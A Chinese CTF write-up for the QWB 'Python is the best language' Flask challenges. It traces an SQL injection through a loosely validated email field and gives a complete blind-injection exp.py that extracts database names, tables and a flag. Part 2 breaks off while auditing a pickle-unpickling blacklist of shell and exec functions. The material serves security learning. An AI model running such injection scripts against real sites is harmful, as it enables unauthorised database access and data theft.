             踩(0)</a></span>
                </div>
            </div>
            <hr>
            <div id="topic_content" class="topic-content markdown-body">
                
                    <p></p><h1>题目</h1>
<p>Python is the best language 1/2</p>

<pre><code>http://39.107.32.29:20000

http://117.50.16.51:20000

下载地址
备用下载地址（密码：rtou）

I'm learning the flask recently,and I think python is the best language in the world!don't you think so?</code></pre>
<h1>Python is the best language 1</h1>
<p>源码下载下来后，由于是基于flask框架，因此先看了看路由文件<code>routes.py</code>，大概如下：</p>
<div class="highlight"><pre><span></span><span class="nd">@app.before_request</span>
<span class="k">def</span> <span class="nf">before_request</span><span class="p">():</span>

<span class="nd">@app.teardown_request</span>
<span class="k">def</span> <span class="nf">shutdown_session</span><span class="p">(</span><span class="n">exception</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/index'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/explore'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">explore</span><span class="p">():</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/logout'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/register'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/user/&lt;username&gt;'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">user</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/edit_profile'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">edit_profile</span><span class="p">():</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/follow/&lt;username&gt;'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">follow</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/unfollow/&lt;username&gt;'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">unfollow</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
</pre></div>
<p>这些功能大部分是基于登陆的，因此从注册和登陆相关的代码入手。</p>
<div class="highlight"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/register'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">current_user</span><span class="o">.</span><span class="n">is_authenticated</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'index'</span><span class="p">))</span>
    <span class="n">form</span> <span class="o">=</span> <span class="n">RegistrationForm</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">form</span><span class="o">.</span><span class="n">validate_on_submit</span><span class="p">():</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">"user"</span><span class="p">,</span> <span class="p">[</span><span class="s2">"NULL"</span><span class="p">,</span> <span class="s2">"'</span><span class="si">%s</span><span class="s2">'"</span> <span class="o">%</span> <span class="n">form</span><span class="o">.</span><span class="n">username</span><span class="o">.</span><span class="n">data</span><span class="p">,</span> <span class="s2">"'</span><span class="si">%s</span><span class="s2">'"</span> <span class="o">%</span> <span class="n">form</span><span class="o">.</span><span class="n">email</span><span class="o">.</span><span class="n">data</span><span class="p">,</span>
                                 <span class="s2">"'</span><span class="si">%s</span><span class="s2">'"</span> <span class="o">%</span> <span class="n">generate_password_hash</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="s2">"''"</span><span class="p">,</span> <span class="s2">"'</span><span class="si">%s</span><span class="s2">'"</span> <span class="o">%</span> <span class="n">now</span><span class="p">()])</span>
        <span class="k">if</span> <span class="n">res</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">flash</span><span class="p">(</span><span class="s1">'Congratulations, you are now a registered user!'</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'login'</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'register.html'</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="s1">'Register'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
</pre></div>
<p>跟进<code>RegistrationForm</code>，定义在 <code>forms.py</code>的第20行:</p>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">RegistrationForm</span><span class="p">(</span><span class="n">FlaskForm</span><span class="p">):</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">StringField</span><span class="p">(</span><span class="s1">'Username'</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">()])</span>
    <span class="n">email</span> <span class="o">=</span> <span class="n">StringField</span><span class="p">(</span><span class="s1">'Email'</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">(),</span> <span class="n">Email</span><span class="p">()])</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">PasswordField</span><span class="p">(</span><span class="s1">'Password'</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">()])</span>
    <span class="n">password2</span> <span class="o">=</span> <span class="n">PasswordField</span><span class="p">(</span>
        <span class="s1">'Repeat Password'</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">(),</span> <span class="n">EqualTo</span><span class="p">(</span><span class="s1">'password'</span><span class="p">)])</span>
    <span class="n">submit</span> <span class="o">=</span> <span class="n">SubmitField</span><span class="p">(</span><span class="s1">'Register'</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">validate_username</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="s2">"^[a-zA-Z0-9_]+$"</span><span class="p">,</span> <span class="n">username</span><span class="o">.</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">ValidationError</span><span class="p">(</span><span class="s1">'username has invalid charactor!'</span><span class="p">)</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">One</span><span class="p">(</span><span class="s2">"user"</span><span class="p">,</span> <span class="p">{</span><span class="s2">"username"</span><span class="p">:</span> <span class="s2">"'</span><span class="si">%s</span><span class="s2">'"</span> <span class="o">%</span> <span class="n">username</span><span class="o">.</span><span class="n">data</span><span class="p">},</span> <span class="p">[</span><span class="s2">"id"</span><span class="p">])</span>
        <span class="k">if</span> <span class="n">user</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">ValidationError</span><span class="p">(</span><span class="s1">'Please use a different username.'</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">validate_email</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">One</span><span class="p">(</span><span class="s2">"user"</span><span class="p">,</span> <span class="p">{</span><span class="s2">"email"</span><span class="p">:</span>  <span class="s2">"'</span><span class="si">%s</span><span class="s2">'"</span> <span class="o">%</span> <span class="n">email</span><span class="o">.</span><span class="n">data</span><span class="p">},</span> <span class="p">[</span><span class="s2">"id"</span><span class="p">])</span>
        <span class="k">if</span> <span class="n">user</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">ValidationError</span><span class="p">(</span><span class="s1">'Please use a different email address.'</span><span class="p">)</span>
</pre></div>
<p>在这里可以很明显的看到两个验证函数有差别，<code>validate_username</code>在进行<code>mysql.One</code>前进行了正则匹配的过滤和审核，而<code>validate_email</code>仅仅通过<code>validators=[DataRequired(), Email()]</code>来匹配。</p>
<p><code>Email</code>定义在<code>wtforms.validators</code>中，相关源码如下：</p>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Email</span><span class="p">(</span><span class="n">Regexp</span><span class="p">):</span>
    <span class="sd">"""</span>
<span class="sd">    Validates an email address. Note that this uses a very primitive regular</span>
<span class="sd">    expression and should only be used in instances where you later verify by</span>
<span class="sd">    other means, such as email activation or lookups.</span>
<span class="sd">    :param message:</span>
<span class="sd">        Error message to raise in case of a validation error.</span>
<span class="sd">    """</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">validate_hostname</span> <span class="o">=</span> <span class="n">HostnameValidation</span><span class="p">(</span>
            <span class="n">require_tld</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
        <span class="p">)</span>
        <span class="nb">super</span><span class="p">(</span><span class="n">Email</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="sa">r</span><span class="s1">'^.+@([^.@][^@]+)$'</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>
    <span class="k">def</span> <span class="fm">__call__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">form</span><span class="p">,</span> <span class="n">field</span><span class="p">):</span>
        <span class="n">message</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">message</span>
        <span class="k">if</span> <span class="n">message</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">message</span> <span class="o">=</span> <span class="n">field</span><span class="o">.</span><span class="n">gettext</span><span class="p">(</span><span class="s1">'Invalid email address.'</span><span class="p">)</span>
        <span class="n">match</span> <span class="o">=</span> <span class="nb">super</span><span class="p">(</span><span class="n">Email</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__call__</span><span class="p">(</span><span class="n">form</span><span class="p">,</span> <span class="n">field</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">validate_hostname</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)):</span>
            <span class="k">raise</span> <span class="n">ValidationError</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
</pre></div>
<p>其正则规则为<code>^.+@([^.@][^@]+)$</code>，也就是说对email而言，即使提交如<code>'"#a@q.com</code>包含单引号，双引号，注释符等敏感字符的形式也是能通过的。</p>
<p>回到<code>validate_email</code>验证函数中：</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">validate_email</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">One</span><span class="p">(</span><span class="s2">"user"</span><span class="p">,</span> <span class="p">{</span><span class="s2">"email"</span><span class="p">:</span>  <span class="s2">"'</span><span class="si">%s</span><span class="s2">'"</span> <span class="o">%</span> <span class="n">email</span><span class="o">.</span><span class="n">data</span><span class="p">},</span> <span class="p">[</span><span class="s2">"id"</span><span class="p">])</span>
    <span class="k">if</span> <span class="n">user</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">ValidationError</span><span class="p">(</span><span class="s1">'Please use a different email address.'</span><span class="p">)</span>
</pre></div>
<p>跟入<code>mysql.One</code>，定义在others.py:</p>
<div class="highlight"><pre><span></span><span class="c1"># mysql.One("user", {"email":  "'%s'" % email.data}, ["id"])</span>
<span class="k">def</span> <span class="nf">One</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tablename</span><span class="p">,</span> <span class="n">where</span><span class="o">=</span><span class="p">{},</span> <span class="n">feildname</span><span class="o">=</span><span class="p">[</span><span class="s2">"*"</span><span class="p">],</span> <span class="n">order</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span> <span class="n">where_symbols</span><span class="o">=</span><span class="s2">"="</span><span class="p">,</span> <span class="n">l</span><span class="o">=</span><span class="s2">"and"</span><span class="p">):</span>
    <span class="c1"># self.Sel("user", {"email":  "'%s'" % email.data}, ["id"], "", "=", l)</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">Sel</span><span class="p">(</span><span class="n">tablename</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">feildname</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span> <span class="n">where_symbols</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">res</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">db_session</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">res</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">return</span> <span class="mi">0</span>
        <span class="k">return</span> <span class="n">res</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
</pre></div>
<p>跟入<code>self.Sel</code>:</p>
<div class="highlight"><pre><span></span><span class="c1"># self.Sel("user", {"email":  "'%s'" % email.data}, ["id"], "", "=", l)</span>
<span class="k">def</span> <span class="nf">Sel</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tablename</span><span class="p">,</span> <span class="n">where</span><span class="o">=</span><span class="p">{},</span> <span class="n">feildname</span><span class="o">=</span><span class="p">[</span><span class="s2">"*"</span><span class="p">],</span> <span class="n">order</span><span class="o">=</span><span class="s2">""</span><span class="p">,</span> <span class="n">where_symbols</span><span class="o">=</span><span class="s2">"="</span><span class="p">,</span> <span class="n">l</span><span class="o">=</span><span class="s2">"and"</span><span class="p">):</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="s2">"select "</span>
    <span class="n">sql</span> <span class="o">+=</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="s2">","</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">feildname</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">" "</span>
    <span class="n">sql</span> <span class="o">+=</span> <span class="s2">"from "</span> <span class="o">+</span> <span class="n">tablename</span> <span class="o">+</span> <span class="s2">" "</span>
    <span class="k">if</span> <span class="n">where</span> <span class="o">!=</span> <span class="p">{}:</span>
        <span class="n">sql</span> <span class="o">+=</span> <span class="s2">"where "</span> <span class="o">+</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="s2">" "</span> <span class="o">+</span> <span class="n">where_symbols</span> <span class="o">+</span> <span class="s2">" "</span> <span class="o">+</span>
                                    <span class="nb">str</span><span class="p">(</span><span class="n">where</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="s2">" "</span> <span class="o">+</span> <span class="n">l</span> <span class="o">+</span> <span class="s2">" "</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">where</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">order</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">+=</span> <span class="s2">"order by "</span> <span class="o">+</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="s2">","</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">order</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">sql</span>
</pre></div>
<p>最后拼接出来的sql语句如下：</p>
<div class="highlight"><pre><span></span><span class="k">select</span> <span class="n">id</span> <span class="k">from</span> <span class="k">user</span> <span class="k">where</span> <span class="n">email</span> <span class="o">=</span> <span class="s1">'your input email'</span>
</pre></div>
<p>结合前面所说的对输入邮箱email形式的验证，这里存在sql注入漏洞。我们设置邮箱为<code>test'/**/or/**/1=1#@test.com</code>，则拼接后的sql语句为：</p>
<div class="highlight"><pre><span></span><span class="k">select</span> <span class="n">id</span> <span class="k">from</span> <span class="k">user</span> <span class="k">where</span> <span class="n">email</span> <span class="o">=</span> <span class="s1">'test'</span><span class="cm">/**/</span><span class="k">or</span><span class="cm">/**/</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#@</span><span class="n">test</span><span class="p">.</span><span class="n">com</span><span class="err">'</span>
</pre></div>
<p>可以看到成功注入。由于此处不能回显数据，因此采用盲注。回到<code>validate_username</code></p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">validate_username</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="s2">"^[a-zA-Z0-9_]+$"</span><span class="p">,</span> <span class="n">username</span><span class="o">.</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">ValidationError</span><span class="p">(</span><span class="s1">'username has invalid charactor!'</span><span class="p">)</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">One</span><span class="p">(</span><span class="s2">"user"</span><span class="p">,</span> <span class="p">{</span><span class="s2">"username"</span><span class="p">:</span> <span class="s2">"'</span><span class="si">%s</span><span class="s2">'"</span> <span class="o">%</span> <span class="n">username</span><span class="o">.</span><span class="n">data</span><span class="p">},</span> <span class="p">[</span><span class="s2">"id"</span><span class="p">])</span>
    <span class="k">if</span> <span class="n">user</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">ValidationError</span><span class="p">(</span><span class="s1">'Please use a different username.'</span><span class="p">)</span>
</pre></div>
<p>当查询为真时也即<code>user != 0</code>会出现信息<code>Please use a different username.</code>，结合这点构造出最后的exp.py：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://39.107.32.29:20000/register"</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span><span class="s2">"html5lib"</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s1">'csrf_token'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"value"</span><span class="p">)</span>

<span class="n">notice</span> <span class="o">=</span> <span class="s2">"Please use a different email address."</span>
<span class="n">result</span> <span class="o">=</span> <span class="s2">""</span>

<span class="n">database</span> <span class="o">=</span> <span class="s2">"(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"</span>
<span class="n">tables</span> <span class="o">=</span> <span class="s2">"(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"</span>
<span class="n">columns</span> <span class="o">=</span> <span class="s2">"(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"</span>
<span class="n">data</span> <span class="o">=</span> <span class="s2">"(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)"</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="s2">"test'/**/or/**/ascii(substr("</span><span class="o">+</span>  <span class="n">data</span> <span class="o">+</span><span class="s2">",</span><span class="si">%d</span><span class="s2">,1))=</span><span class="si">%d</span><span class="s2">#/**/@chybeta.com"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
        <span class="k">print</span> <span class="n">payload</span>
        <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">'csrf_token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span>
            <span class="s1">'username'</span><span class="p">:</span> <span class="s1">'a'</span><span class="p">,</span>
            <span class="s1">'email'</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span>
            <span class="s1">'password'</span><span class="p">:</span><span class="s1">'a'</span><span class="p">,</span>
            <span class="s1">'password2'</span><span class="p">:</span><span class="s1">'a'</span><span class="p">,</span>
            <span class="s1">'submit'</span><span class="p">:</span><span class="s1">'Register'</span>
        <span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span><span class="s2">"html5lib"</span><span class="p">)</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s1">'csrf_token'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"value"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">notice</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
            <span class="k">print</span> <span class="n">result</span>
            <span class="k">break</span>
</pre></div>
<p>由于在注册部分有csrf_token，因此在每次submit时要记得带上，同时在每次返回的页面中取得下一次的csrf_token。</p>
<p>最后的flag：</p>

<pre><code>QWB{us1ng_val1dator_caut1ous}</code></pre>
<h1>Python is the best language 2</h1>
<h2 id="toc-0">分析</h2>
<p>接着进行代码审计。在<code>others.py</code>的最后有这样的内容：</p>
<div class="highlight"><pre><span></span><span class="n">black_type_list</span> <span class="o">=</span> <span class="p">[</span><span class="nb">eval</span><span class="p">,</span> <span class="nb">execfile</span><span class="p">,</span> <span class="nb">compile</span><span class="p">,</span> <span class="n">system</span><span class="p">,</span> <span class="nb">open</span><span class="p">,</span> <span class="nb">file</span><span class="p">,</span> <span class="n">popen</span><span class="p">,</span> <span class="n">popen2</span><span class="p">,</span> <span class="n">popen3</span><span class="p">,</span> <span class="n">popen4</span><span class="p">,</span> <span class="n">fdopen</span><span class="p">,</span>
                   <span class="n">tmpfile</span><span class="p">,</span> <span class="n">fchmod</span><span class="p">,</span> <span class="n">fchown</span><span class="p">,</span> <span class="n">pipe</span><span class="p">,</span> <span class="n">chdir</span><span class="p">,</span> <span class="n">fchdir</span><span class="p">,</span> <span class="n">chroot</span><span class="p">,</span> <span class="n">chmod</span><span class="p">,</span> <span class="n">chown</span><span class="p">,</span> <span class="n">link</span><span class="p">,</span>
                   <span class="n">lchown</span><span class="p">,</span> <span class="n">listdir</span><span class="p">,</span> <span class="n">lstat</span><span class="p">,</span> <span class="n">mkfifo</span><span class="p">,</span> <span class="n">mknod</span><span class="p">,</span> <span class="n">mkdir</span><span class="p">,</span> <span class="n">makedirs</span><span class="p">,</span> <span class="n">readlink</span><span class="p">,</span> <span class="n">remove</span><span class="p">,</span> <span class="n">removedirs</span><span class="p">,</span>
                   <span class="n">rename</span><span class="p">,</span> <span class="n">renames</span><span class="p">,</span> <span class="n">rmdir</span><span class="p">,</span> <span class="n">tempnam</span><span class="p">,</span> <span class="n">tmpnam</span><span class="p">,</span> <span class="n">unlink</span><span class="p">,</span> <span class="n">walk</span><span class="p">,</span> <span class="n">execl</span><span class="p">,</span> <span class="n">execle</span><span class="p">,</span> <span class="n">execlp</span><span class="p">,</span> <span class="n">execv</span><span class="p">,</span>
                   <span class="n">execve</span><span class="p">,</span> <span class="n">execvp</span><span class="p">,</span> <span class="n">execvpe</span><span class="p">,</span> <span class="nb">exit</span><span class="p">,</span> <span class="n">fork</span><span class="p">,</span> <span class="n">forkpty</span><span class="p">,</span> <span class="n">kill</span><span class="p">,</span> <span class="n">nice</span><span class="p">,</span> <span class="n">spawnl</span><span class="p">,</span> <span class="n">spawnle</span><span class="p">,</span> <span class="n">spawnlp</span><span class="p">,</span> <span class="n">spawnlpe</span><span class="p">,</span>
                   <span class="n">spawnv</span><span class="p">,</span> <span class="n">spawnve</span><span class="p">,</span> <span class="n">spawnvp</span><span class="p">,</span> <span class="n">spawnvpe</span><span class="p">,</span> <span class="n">load</span><span class="p">,</span> <span class="n">loads</span><span class="p">]</span>


<span class="k">class</span> <span class="nc">FilterException</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>

    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
        <span class="nb">super</span><span class="p">(</span><span class="n">FilterException</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span>
            <span class="s1">'the callable object {value} is not allowed'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)))</span>


<span class="k">def</span> <span class="nf">_hook_call</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">wrapper</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="k">print</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">stack</span>
        <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="ow">in</span> <span class="n">black_type_list</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">FilterException</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span>
        <span class="k">return</span> <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">wrapper</span>


<span class="k">def</span> <span class="nf">load</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">unpkler</span> <span class="o">=</span> <span class="n">Unpkler</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
